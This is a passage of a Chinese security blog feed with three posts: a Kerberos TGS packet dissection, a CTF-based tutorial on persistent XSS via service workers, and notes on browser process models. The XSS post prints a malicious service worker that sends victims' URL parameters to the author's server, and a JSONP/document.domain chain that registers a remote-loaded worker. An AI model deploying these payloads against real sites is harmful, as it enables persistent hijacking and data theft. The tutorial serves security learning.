bytes on wire (496 bits), 62 bytes captured (496 bits) on interface \Device\NPF_&#123;FBDB2B2D-DEF3-473C-87EF-787E4B606694&#125;, id 0</span><br><span class="line">Ethernet II, Src: VMware_f0:d8:2b (00:0c:29:f0:d8:2b), Dst: VMware_e6:ab:e6 (00:0c:29:e6:ab:e6)</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.1.2, Dst: 192.168.1.1</span><br><span class="line">Transmission Control Protocol, Src Port: 49731, Dst Port: 88, Seq: 1461, Ack: 1, Len: 8</span><br><span class="line">[2 Reassembled TCP Segments (1468 bytes): #39(1460), #40(8)]</span><br><span class="line">Kerberos</span><br><span class="line">    Record Mark: 1464 bytes</span><br><span class="line">    tgs-req</span><br><span class="line">        pvno: 5</span><br><span class="line">        msg-type: krb-tgs-req (12)</span><br><span class="line">        padata: 2 items</span><br><span class="line">            PA-DATA PA-TGS-REQ</span><br><span class="line">                padata-type: kRB5-PADATA-TGS-REQ (1)</span><br><span class="line">                    padata-value: 6e8204f4308204f0a003020105a10302010ea20703050000…</span><br><span class="line">            PA-DATA PA-PAC-OPTIONS</span><br><span class="line">                padata-type: kRB5-PADATA-PAC-OPTIONS (167)</span><br><span class="line">                    padata-value: 3009a00703050040000000</span><br><span class="line">        req-body</span><br><span class="line">            Padding: 0</span><br><span class="line">            kdc-options: 40810000</span><br><span class="line">                0... .... &#x3D; reserved: False</span><br><span class="line">                .1.. .... &#x3D; forwardable: True</span><br><span class="line">                ..0. .... &#x3D; forwarded: False</span><br><span class="line">                ...0 .... &#x3D; proxiable: False</span><br><span class="line">                .... 0... &#x3D; proxy: False</span><br><span class="line">                .... .0.. &#x3D; allow-postdate: False</span><br><span class="line">                .... ..0. &#x3D; postdated: False</span><br><span class="line">                .... ...0 &#x3D; unused7: False</span><br><span class="line">                1... .... &#x3D; renewable: True</span><br><span class="line">                .0.. .... &#x3D; unused9: False</span><br><span class="line">                ..0. .... &#x3D; unused10: False</span><br><span class="line">                ...0 .... &#x3D; opt-hardware-auth: False</span><br><span class="line">                .... 0... &#x3D; unused12: False</span><br><span class="line">                .... .0.. &#x3D; unused13: False</span><br><span class="line">                .... ..0. &#x3D; constrained-delegation: False</span><br><span class="line">                .... ...1 &#x3D; canonicalize: True</span><br><span class="line">                0... .... &#x3D; request-anonymous: False</span><br><span class="line">                .0.. .... &#x3D; unused17: False</span><br><span class="line">                ..0. .... &#x3D; unused18: False</span><br><span class="line">                ...0 .... &#x3D; unused19: False</span><br><span class="line">                .... 0... &#x3D; unused20: False</span><br><span class="line">                .... .0.. &#x3D; unused21: False</span><br><span class="line">                .... ..0. &#x3D; unused22: False</span><br><span class="line">                .... ...0 &#x3D; unused23: False</span><br><span class="line">                0... .... &#x3D; unused24: False</span><br><span class="line">                .0.. .... &#x3D; unused25: False</span><br><span class="line">                ..0. .... &#x3D; disable-transited-check: False</span><br><span class="line">                ...0 .... &#x3D; renewable-ok: False</span><br><span class="line">                .... 0... &#x3D; enc-tkt-in-skey: False</span><br><span class="line">                .... .0.. &#x3D; unused29: False</span><br><span class="line">                .... ..0. &#x3D; renew: False</span><br><span class="line">                .... ...0 &#x3D; validate: False</span><br><span class="line">            realm: HACKE.TESTLAB</span><br><span class="line">            sname</span><br><span class="line">                name-type: kRB5-NT-SRV-HST (3)</span><br><span class="line">                sname-string: 2 items</span><br><span class="line">                    SNameString: host</span><br><span class="line">                    SNameString: win10-x64-test.hacke.testlab</span><br><span class="line">            till: 2037-09-13 02:48:05 (UTC)</span><br><span class="line">            nonce: 19595592</span><br><span class="line">            etype: 5 items</span><br><span class="line">                ENCTYPE: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)</span><br><span class="line">                ENCTYPE: eTYPE-AES128-CTS-HMAC-SHA1-96 (17)</span><br><span class="line">                ENCTYPE: eTYPE-ARCFOUR-HMAC-MD5 (23)</span><br><span class="line">                ENCTYPE: eTYPE-ARCFOUR-HMAC-MD5-56 (24)</span><br><span class="line">                ENCTYPE: eTYPE-ARCFOUR-HMAC-OLD-EXP (-135)</span><br></pre></td></tr></table></figure><ul><li><p>msg-type</p><p>windows消息格式，krb-tgs-req</p></li><li><p>padata</p><p>这部分携带了TGS_REQ最重要的数据—TGT票据，TGT票据以ap-req的形式存放在数据包之中。KDC会校验TGT，如果正确就返回TGS票据</p><p>这部分数据和还包含PAC和S4U2SELF,这个之后其他文章单独说</p></li><li><p>req-body</p><p>格式和之前的请求报文基本一致，只是这里的<em>sname</em>换成了<strong><em>Client</em></strong>想要请求服务的<strong><em>Server</em></strong>的名字</p></li></ul><h2 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h2><p><strong><em>数据包拆解</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Kerberos</span><br><span class="line">    Record Mark: 1495 bytes</span><br><span class="line">        0... .... .... .... .... .... .... .... &#x3D; Reserved: Not set</span><br><span class="line">        .000 0000 0000 0000 0000 0101 1101 0111 &#x3D; Record Length: 1495</span><br><span class="line">    tgs-rep</span><br><span class="line">        pvno: 5</span><br><span class="line">        msg-type: krb-tgs-rep (13)</span><br><span class="line">        crealm: HACKE.TESTLAB</span><br><span class="line">        cname</span><br><span class="line">            name-type: kRB5-NT-PRINCIPAL (1)</span><br><span class="line">            cname-string: 1 item</span><br><span class="line">                CNameString: testuser</span><br><span class="line">        ticket</span><br><span class="line">            tkt-vno: 5</span><br><span class="line">            realm: HACKE.TESTLAB</span><br><span class="line">            sname</span><br><span class="line">                name-type: kRB5-NT-SRV-HST (3)</span><br><span class="line">                sname-string: 2 items</span><br><span class="line">                    SNameString: host</span><br><span class="line">                    SNameString: win10-x64-test.hacke.testlab</span><br><span class="line">            enc-part</span><br><span class="line">                etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)</span><br><span class="line">                kvno: 1</span><br><span class="line">                cipher: 1fc40f7b907bea22e5606abf4f0575c113b8f5ee8d87ce4f…</span><br><span class="line">        enc-part</span><br><span class="line">            etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)</span><br><span class="line">            cipher: e4705cfafb271944be50c33f4576bb4b4e449357fbdbb18f…</span><br></pre></td></tr></table></figure><ul><li><p>msg-type</p><p>windows消息格式，krb-tgs-rep</p></li><li><p>crealm</p><p>Client所属域</p></li><li><p>cname</p><p>Client的身份名</p></li><li><p>ticket</p><p>这就是最终的票据，是使用Client请求服务的Server的hash作为key来加密得到的。内部包含:<code>Server session key</code>、<code>Client info (Domain name\client)</code>、<code>end time (到期时间)</code></p></li><li><p>enc-part</p><p>这一部分是使用AS认证中得<code>Session key</code>为key加密成得内部有<code>Server session key</code>,主要用于下轮用户认证(AP阶段)</p></li></ul><p>参考连接：</p><p><a href="https://daiker.gitbook.io/windows-protocol/" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网渗透学习—kerberos协议&quot;&gt;&lt;a href=&quot;#内网渗透学习—kerberos协议&quot; class=&quot;headerlink&quot; title=&quot;内网渗透学习—kerberos协议&quot;&gt;&lt;/a&gt;内网渗透学习—kerberos协议&lt;/h1&gt;&lt;h4 id=&quot;kerbe
      
    
    </summary>
    
    
      <category term="域渗透基础" scheme="http://yoursite.com/categories/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="windows认证协议" scheme="http://yoursite.com/tags/windows%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE/"/>
    
      <category term="域渗透" scheme="http://yoursite.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>持久化xss基础——xss with service worker</title>
    <link href="http://yoursite.com/2020/11/02/%E6%8C%81%E4%B9%85%E5%8C%96XSS/"/>
    <id>http://yoursite.com/2020/11/02/%E6%8C%81%E4%B9%85%E5%8C%96XSS/</id>
    <published>2020-11-02T04:15:59.197Z</published>
    <updated>2020-11-02T08:50:52.037Z</updated>
    
    <content type="html"><![CDATA[<h1 id="持久化XSS基础-——-xss-with-service-worker"><a href="#持久化XSS基础-——-xss-with-service-worker" class="headerlink" title="持久化XSS基础 —— xss with service worker"></a>持久化XSS基础 —— xss with service worker</h1><h2 id="service-worker-的简介"><a href="#service-worker-的简介" class="headerlink" title="service worker 的简介"></a>service worker 的简介</h2><h3 id="service-worker的概念"><a href="#service-worker的概念" class="headerlink" title="service worker的概念"></a>service worker的概念</h3><blockquote><p>Service worker是一个注册在指定源和路径下的事件驱动<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Worker" target="_blank" rel="noopener">worker</a>。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。你可以完全控制应用在特定情形（最常见的情形是网络不可用）下的表现。</p><p>Service worker运行在worker上下文，因此它不能访问DOM。相对于驱动应用的主JavaScript线程，它运行在其他线程中，所以不会造成阻塞。它设计为完全异步，同步API（如<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest" target="_blank" rel="noopener">XHR</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/API/DOM/Storage" target="_blank" rel="noopener">localStorage</a>）不能在service worker中使用。</p><p>出于安全考量，Service workers只能由HTTPS（出于调试方便，还支持在localhost使用），毕竟修改网络请求的能力暴露给中间人攻击会非常危险。在Firefox浏览器的<a href="https://support.mozilla.org/zh-CN/kb/隐私浏览" target="_blank" rel="noopener">用户隐私模式</a>，Service Worker不可用。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">官方文档</a></p></blockquote><p>1、只能注册同源下的js</p><p>2、站内必须支持Secure Context，也就是站内必须是<code>https://</code>或者<code>http://localhost/</code></p><p>3、Content-Type必须是js</p><ul><li>text/javascript</li><li>application/x-javascript</li><li>application/javascript</li></ul><p>总之service worker就是一个介于服务端和客户端的一个 代理服务器。</p><h3 id="service-worker的基本架构"><a href="#service-worker的基本架构" class="headerlink" title="service worker的基本架构"></a>service worker的基本架构</h3><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><p>service worker是通过serviceWorkerContainer.register() 来获取和注册的</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201031134706014.png" alt="image-20201031134706014"></p><blockquote><p>关于Promise</p><p><strong>Promise</strong> 对象用于表示一个异步操作的最终完成 (或失败)及其结果值。其精髓是支持链式调用。</p><p>必然是以下三种状态之一</p><ul><li><em>待定（pending）</em>: 初始状态，既没有被兑现，也没有被拒绝。</li><li><em>已兑现（fulfilled）</em>: 意味着操作成功完成。</li><li><em>已拒绝（rejected）</em>: 意味着操作失败。</li></ul></blockquote><p>整个生命流程大致为下面的的几个步骤：</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201031131851448.png" alt="image-20201031131851448"></p><h4 id="支持的事件"><a href="#支持的事件" class="headerlink" title="支持的事件"></a>支持的事件</h4><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201031132732725.png" alt="image-20201031132732725"></p><h4 id="service-worker的作用域"><a href="#service-worker的作用域" class="headerlink" title="service worker的作用域"></a>service worker的作用域</h4><ul><li>service worker 只能抓取在 service worker scope 里从客户端发出的请求。</li><li>最大的 scope 是 service worker 所在的地址</li><li>如果你的 service worker 被激活在一个有 <code>Service-Worker-Allowed</code> header 的客户端，你可以为service worker 指定一个最大的 scope 的列表。</li><li>在 Firefox, Service Worker APIs 在用户在 用户隐私模式 下会被隐藏而且无法使用。</li></ul><p>整个service worker的作用域默认是service  woker 注册的脚本的路径。这个作用也可以使用跨域的方法扩展。</p><h3 id="service-worker控制页面返回响应"><a href="#service-worker控制页面返回响应" class="headerlink" title="service worker控制页面返回响应"></a>service worker控制页面返回响应</h3><h5 id="fetch事件"><a href="#fetch事件" class="headerlink" title="fetch事件"></a>fetch事件</h5><blockquote><p>使用<code>ServiceWorker</code>技术时,页面的提取动作会在ServiceWorker作用域(<code>ServiceWorkerGlobalScope</code>)中触发fetch事件.</p></blockquote><p>service worker可以监听fetch事件来达到篡改返回，对页面嵌入恶意的srcipt脚本。</p><h5 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h5><ul><li><p><code>WorkerGlobalScope.addEventListener(type,listener,option)</code></p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201101192113623.png" alt="image-20201101192113623"></p></li><li><p><code>event.respondwith(任何自定义的响应生成代码)</code></p><p>这个方法的目的是包裹段可以生成、返回response对象的代码，来控制响应。</p></li><li><p><code>Response(body,init)</code></p><p><img src="C:%5CUsers%5C3000%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201101193028796.png" alt="image-20201101193028796"></p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个脚本可以将service worker作用域下的所有请求的url参数打到我的vps上。</span></span><br><span class="line"><span class="comment">//当然你也可以通过返回其他的东西来达到其他的目的。</span></span><br><span class="line"></span><br><span class="line">self.addEventListener(<span class="string">'install'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'install ok!'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">self.addEventListener(<span class="string">'fetch'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(event.request);</span><br><span class="line">event.respondWith(</span><br><span class="line">caches.match(event.request).then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">'&lt;script&gt;location="http://IP?"+btoa(location.search)&lt;/script&gt;'</span>, &#123;<span class="attr">headers</span>: &#123; <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span> &#125;&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="service-worker的简单利用"><a href="#service-worker的简单利用" class="headerlink" title="service worker的简单利用"></a>service worker的简单利用</h2><h3 id="JSONP-service-worker"><a href="#JSONP-service-worker" class="headerlink" title="JSONP+service worker"></a>JSONP+service worker</h3><p>经过的介绍，知道了service worker只能使用同源的脚本注册，那么熟悉xss的师傅就很容易想到通过跨域来实现注册恶意脚本，那么JSONP就是一个好的搭配，因为jsonp的返回值都是js格式的，十分符合service worker的要求。</p><p><strong><em>西湖论剑2020的 jsonp</em></strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这段代码最终的效果就是在页面上生成一个</span></span><br><span class="line"><span class="comment">// &lt;script src="https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=输入的参数"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">//标签</span></span><br><span class="line"></span><br><span class="line">callback = <span class="string">"get_user_login_status"</span>;</span><br><span class="line">auto_reg_var();<span class="comment">//获取url参数</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(jump_url) == <span class="string">"undefined"</span> || <span class="regexp">/^\//</span>.test(jump_url))&#123;</span><br><span class="line">    jump_url = <span class="string">"/"</span>;</span><br><span class="line">&#125;</span><br><span class="line">jsonp(<span class="string">"https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback="</span> + callback,<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(result[<span class="string">'status'</span>])&#123;</span><br><span class="line">        location.href = jump_url;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">url, success</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">    <span class="keyword">if</span>(url.indexOf(<span class="string">"callback"</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> funName = <span class="string">'callback_'</span> + <span class="built_in">Date</span>.now() + <span class="built_in">Math</span>.random().toString().substr(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">        url = url + <span class="string">"?"</span> + <span class="string">"callback="</span> + funName;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> funName = callback;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>[funName] = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        success(data);</span><br><span class="line">        <span class="keyword">delete</span> <span class="built_in">window</span>[funName];</span><br><span class="line">        <span class="built_in">document</span>.body.removeChild(script);</span><br><span class="line">    &#125;</span><br><span class="line">    script.src = url;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auto_reg_var</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> search = location.search.slice(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> search_arr = search.split(<span class="string">'&amp;'</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; search_arr.length; i++)&#123;</span><br><span class="line">        [key,value] = search_arr[i].split(<span class="string">"="</span>);</span><br><span class="line">        <span class="built_in">window</span>[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件上传-service-worker"><a href="#文件上传-service-worker" class="headerlink" title="文件上传+service worker"></a>文件上传+service worker</h3><p>如果有文件上传的点，可以尝试上传恶意js脚本，一般来说上传的js代码也是js格式的。</p><h2 id="service-worker综合跨域扩展攻击"><a href="#service-worker综合跨域扩展攻击" class="headerlink" title="service worker综合跨域扩展攻击"></a>service worker综合跨域扩展攻击</h2><p><strong><em>西湖论剑2020xss</em></strong></p><p>在这个环境里面，有两个域名<code>auth.hardxss.xhlj.wetolink.com</code>和<code>xss.hardxss.xhlj.wetolink.com</code></p><p>jsop的点在 auth 子域名里面，xss的点在 xss 子域名里面，并且在xss页面有一个设置<code>document.domian=hardxss.xhlj.wetolink.com</code></p><p>的内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.domain = <span class="string">"hardxss.xhlj.wetolink.com"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们就可以尝试使用设置doucment.domain的方法来实行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain = <span class="string">"hardxss.xhlj.wetolink.com"</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="keyword">if</span> = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line"><span class="keyword">if</span>.src = <span class="string">'https://auth.hardxss.xhlj.wetolink.com/'</span>;</span><br><span class="line"><span class="keyword">if</span>.addEventListener(<span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; iffLoadover(); &#125;);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(<span class="keyword">if</span>);</span><br><span class="line">exp = <span class="string">`navigator.serviceWorker.register("/api/loginStatus?callback=self.importScripts('vps/test.js')")`</span>;<span class="comment">//获取代码，要求https</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iffLoadover</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    iff.contentWindow.eval(exp);<span class="comment">//注册代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><em>test.js</em></strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(<span class="string">'install'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'install ok!'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">self.addEventListener(<span class="string">'fetch'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(event.request);</span><br><span class="line">event.respondWith(</span><br><span class="line">caches.match(event.request).then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">'&lt;script&gt;location="http://IP?"+btoa(location.search)&lt;/script&gt;'</span>, &#123;<span class="attr">headers</span>: &#123; <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span> &#125;&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;持久化XSS基础-——-xss-with-service-worker&quot;&gt;&lt;a href=&quot;#持久化XSS基础-——-xss-with-service-worker&quot; class=&quot;headerlink&quot; title=&quot;持久化XSS基础 —— xss with s
      
    
    </summary>
    
    
      <category term="xss with service worker" scheme="http://yoursite.com/categories/xss-with-service-worker/"/>
    
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
      <category term="web worker" scheme="http://yoursite.com/tags/web-worker/"/>
    
      <category term="持久化xss" scheme="http://yoursite.com/tags/%E6%8C%81%E4%B9%85%E5%8C%96xss/"/>
    
  </entry>
  
  <entry>
    <title>浏览器模型基础</title>
    <link href="http://yoursite.com/2020/10/27/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2020/10/27/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</id>
    <published>2020-10-27T11:55:51.841Z</published>
    <updated>2020-10-27T11:59:03.513Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浏览器模型问题"><a href="#浏览器模型问题" class="headerlink" title="浏览器模型问题"></a>浏览器模型问题</h1><p>多进程与多线程</p><h3 id="浏览器的多进程"><a href="#浏览器的多进程" class="headerlink" title="浏览器的多进程"></a>浏览器的多进程</h3><p>以chrome为代表的主流浏览器都是使用多进程的模型，主要有五种进程</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201021174728754.png" alt="image-20201021174728754"></p><ul><li>Browser Process: 浏览器主进程，负责主控和调用，创建和销毁其他进程。</li><li>GPU Process: 主要负责GPU相关操作。</li><li>Renderer Process: 每创建一个tab页就会开启一个Renderer Process 负责对应的tab页的内部网页呈现的所有，比如说页面渲染，事件执行，脚本执行。这个进程是多线程的。它就是常说的浏览器内核</li><li>Plugin Process: 启用一个插件就会创建一个对应的进程。</li></ul><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201021175217987.png" alt="image-20201021175217987"></p><h3 id="浏览器的多线程"><a href="#浏览器的多线程" class="headerlink" title="浏览器的多线程"></a>浏览器的多线程</h3><p>Renderer Process是浏览器为每一个tab页单独启用的进程，所以每一个Renderer Process 都会有独立的渲染引擎实例。一般来说一个tab下会有如下五个线程</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201021180735426.png" alt="image-20201021180735426"></p><ul><li>CUI线程: 这个线程负责渲染页面的html元素，它再重绘和重排的时候会执行。这个线程和 JS引擎线程互斥。</li></ul><blockquote><p>HTML渲染大致分为如下几步：</p><ol><li>HTML被HTML解析器解析成DOM Tree, css则被css解析器解析成CSSOM Tree。</li><li>DOM Tree和CSSOM Tree解析完成后，被附加到一起，形成渲染树（Render Tree）。</li><li>节点信息计算(重排)，这个过程被叫做Layout(Webkit)或者Reflow(Mozilla)。即根据渲染树计算每个节点的几何信息。</li><li>渲染绘制(重绘)，这个过程被叫做(Painting 或者 Repaint)。即根据计算好的信息绘制整个页面。</li></ol><p>以上4步简述浏览器的一次渲染过程，理论上，每一次的dom更改或者css几何属性更改，都会引起一次浏览器的重排/重绘过程，而如果是css的非几何属性更改，则只会引起重绘过程。所以说重排一定会引起重绘，而重绘不一定会引起重排。</p></blockquote><ul><li>JS引擎线程(chrome的V8)：JS内核，在后台等待任务，负责解析运行 JS 代码，在一个 Renderer 进程之中同时只能有一个 JS 线程。（JS的单线程性）</li><li>定时触发线程：setTimeout和setInterval的计时器线程，由于 JS 的单线程性，所以设计成又单独的线程计时。</li><li>事件触发线程：负责将浏览器和其他线程触发的符合要求的事件添加到 JS 引擎队列的末尾，等待 JS 引擎执行。</li><li>异步请求线程：在XMLHttpRequest在连接后是通过浏览器新开一个线程请求， 将检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件放到 JavaScript引擎的处理队列中等待处理。</li></ul><p>关于JS单线程的解决</p><blockquote><p>为了多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。</p></blockquote><h2 id="web-workers"><a href="#web-workers" class="headerlink" title="web workers"></a>web workers</h2><h3 id="web-workers的概念"><a href="#web-workers的概念" class="headerlink" title="web workers的概念"></a>web workers的概念</h3><blockquote><p>Web Worker为Web内容在后台线程中运行脚本提供了一种简单的方法。线程可以执行任务而不干扰用户界面。一旦创建， 一个worker 可以将消息发送到创建它的JavaScript代码, 通过将消息发布到该代码指定的事件处理程序（反之亦然）。</p></blockquote><h3 id="web-workers的用法"><a href="#web-workers的用法" class="headerlink" title="web workers的用法"></a>web workers的用法</h3><p>使用构造函数可以创建一个worker对象，构造函数接受一个JavaScript文件的URL，这个文件就是将要在worker线程中运行的代码。值得注意的是worker将会运行在与页面window对象完全不同的全局上下文中。</p><p>在worker线程中你可以运行大部分代码，但是有一些例外：</p><ul><li>DOM对象</li><li>window对象的某些属性和方法</li><li>documen对象</li><li>parent对象</li></ul><p>详细的信息可以参考：<a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Functions_and_classes_available_to_workers" target="_blank" rel="noopener">Functions and classes available to Web Workers</a></p><h3 id="特殊种类的web-workers"><a href="#特殊种类的web-workers" class="headerlink" title="特殊种类的web workers"></a>特殊种类的web workers</h3><ul><li><p>shared workers：可以被不同窗口的对各脚本运行，只要这些workers处于同一个主域。详细的用法会在之后的博文介绍</p></li><li><p>service workers ：般作为web应用程序、浏览器和网络（如果可用）之间的代理服务。他们旨在（除开其他方面）创建有效的离线体验，拦截网络请求，以及根据网络是否可用采取合适的行动，更新驻留在服务器上的资源。他们还将允许访问推送通知和后台同步API。</p><blockquote><p>从网络安全的角度看，此woekers可以被利用成一个持久化XSS的工具。</p></blockquote></li></ul><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Workers_APIs" target="_blank" rel="noopener">官方文档</a></p>]]></content>
    
    <summary type="html">
    
      
      
